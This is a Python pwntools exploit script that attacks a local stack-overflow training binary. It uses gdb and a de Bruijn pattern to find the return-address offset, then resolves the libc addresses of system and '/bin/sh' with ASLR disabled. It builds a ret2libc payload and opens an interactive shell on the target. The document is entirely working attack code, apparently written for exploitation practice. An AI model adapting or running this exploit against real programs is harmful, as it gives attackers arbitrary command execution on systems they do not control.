#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from pygdbmi.gdbcontroller import GdbController
from pprint import pprint, pformat
import os

exe = context.binary = ELF('vuln_stackoverflow-medium')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Determine offset from vulnerable buffer to return address.
#
crashinput = cyclic_metasploit(300)
log.info("Created a DeBruin sequence: %s" % crashinput)

p = log.progress("Running target binary in gdb with DeBruin sequence as input.")
gdbmi = GdbController()
#log.info(f"gdmbi subprocess cmd is {gdbmi.get_subprocess_cmd()}")
gdbmi.write("-file-exec-file " + exe.path)
gdbmi.write("-exec-arguments " + str(crashinput))
os.write(gdbmi.gdb_process.stdin.fileno(), crashinput)
gdbmi.write("-exec-run")
sleep(0.5)
resp = gdbmi.write("run")
pprint(resp)
#resp = gdbmi.get_gdb_response()
#assert(len(resp) == 4)
#gdbmi = GdbController()

# Specify exe its arguments and load the symbol table
#gdbmi.write(f'-file-exec-and-symbols \"{exe.path}\"')
#gdbmi.write(f'-exec-arguments {crashinput}')

# Set breakpoint and start
# gdbmi.write('break ')
#gdbmi.write('-exec-run')
#breakpoint()

#gdbmi.exit()

assert resp[-1]['payload']['signal-name'] == 'SIGSEGV'
eip = int(resp[-1]['payload']['frame']['addr'],16)

p.success("target SEGFAULT, return address overwritten with part of our DeBruin sequence: %s", hex(eip))

offset = cyclic_metasploit_find(eip)
log.info("Offset from vulnerable buffer to return address: %s", offset)

# Determine address of relevant libc functions/parameters
#
libc = exe.libc
log.info("Target is linked to the following libc: %s", libc.path)

base_libc = exe.maps[libc.path]
log.info("Non-randomized (ASLR disabled) base address of libc will be: %s", hex(base_libc))

system = base_libc + libc.functions['system'].address
log.info("Non-randomized address of function system in libc will be %s", hex(system))

str_binsh= base_libc + next(libc.search(b'/bin/sh'))
log.info('Non-randomized address of string "/bin/sh" in libc will be %s', hex(str_binsh))


# Create exploit payload
#


align=0
length_padding = align + offset
log.info("Padding until Return address will be %s" % length_padding)
padding = "A"*length_padding

dummy = "B"*4    # return address of `system` call
payload =  flat(padding, system, dummy, str_binsh)
log.info("Exploit payload: \n%s" % hexdump(payload))


# Start target with exploit payload
# 
io = start([str(payload).encode()])
io.send(payload)
sleep(1) # give process some time to crash
if io.poll() != None:
    log.info("Target crashed.")
    sys.exit(-1)

io.sendline('echo YIPPY-YEAH: Successfully obtained shell !!!')
io.sendline('id')
io.interactive()


